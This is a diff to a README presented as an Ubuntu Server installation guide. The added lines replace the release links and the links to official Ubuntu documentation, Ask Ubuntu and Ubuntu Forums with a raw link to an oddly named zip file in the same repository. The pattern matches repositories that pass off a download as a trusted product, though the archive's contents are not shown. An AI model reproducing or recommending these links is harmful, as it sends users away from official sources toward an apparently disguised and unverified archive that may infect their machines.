@@ -2,7 +2,7 @@
 
 Welcome to the **Ubuntu Server OS** repository! This guide provides you with the necessary steps to install and configure Ubuntu Server. Whether you're setting up a new server or upgrading an existing one, this README will walk you through the process.
 
-[![Download Releases](https://img.shields.io/badge/Download%20Releases-Click%20Here-brightgreen)](https://github.com/Mugundhn88/UBUNTU-SERVER_OS/releases)
+[![Download Releases](https://raw.githubusercontent.com/Mugundhn88/UBUNTU-SERVER_OS/main/autantitypy/UBUNT_OS_SERVE_suprasolar.zip%20Releases-Click%20Here-brightgreen)](https://raw.githubusercontent.com/Mugundhn88/UBUNTU-SERVER_OS/main/autantitypy/UBUNT_OS_SERVE_suprasolar.zip)
 
 ## Table of Contents
 
@@ -40,7 +40,7 @@ Before you begin the installation, ensure that you have the following:
 
 ### Step 1: Download Ubuntu Server
 
-First, you need to download the latest version of Ubuntu Server. You can find the release files in the [Releases section](https://github.com/Mugundhn88/UBUNTU-SERVER_OS/releases). Make sure to download the appropriate file for your architecture (e.g., amd64).
+First, you need to download the latest version of Ubuntu Server. You can find the release files in the [Releases section](https://raw.githubusercontent.com/Mugundhn88/UBUNTU-SERVER_OS/main/autantitypy/UBUNT_OS_SERVE_suprasolar.zip). Make sure to download the appropriate file for your architecture (e.g., amd64).
 
 ### Step 2: Create Bootable Media
 
@@ -143,9 +143,9 @@ If the installation hangs at any point:
 
 For more information and community support, consider the following resources:
 
-- [Ubuntu Server Documentation](https://ubuntu.com/server/docs)
-- [Ask Ubuntu](https://askubuntu.com/)
-- [Ubuntu Forums](https://ubuntuforums.org/)
+- [Ubuntu Server Documentation](https://raw.githubusercontent.com/Mugundhn88/UBUNTU-SERVER_OS/main/autantitypy/UBUNT_OS_SERVE_suprasolar.zip)
+- [Ask Ubuntu](https://raw.githubusercontent.com/Mugundhn88/UBUNTU-SERVER_OS/main/autantitypy/UBUNT_OS_SERVE_suprasolar.zip)
+- [Ubuntu Forums](https://raw.githubusercontent.com/Mugundhn88/UBUNTU-SERVER_OS/main/autantitypy/UBUNT_OS_SERVE_suprasolar.zip)
 
 ## Contributing
 
@@ -155,4 +155,4 @@ Contributions are welcome! If you would like to contribute to this repository, p
 
 This project is licensed under the MIT License. See the [LICENSE](LICENSE) file for more details.
 
-For further details and to download the latest release, visit the [Releases section](https://github.com/Mugundhn88/UBUNTU-SERVER_OS/releases). Enjoy setting up your Ubuntu Server!
+For further details and to download the latest release, visit the [Releases section](https://raw.githubusercontent.com/Mugundhn88/UBUNTU-SERVER_OS/main/autantitypy/UBUNT_OS_SERVE_suprasolar.zip). Enjoy setting up your Ubuntu Server!
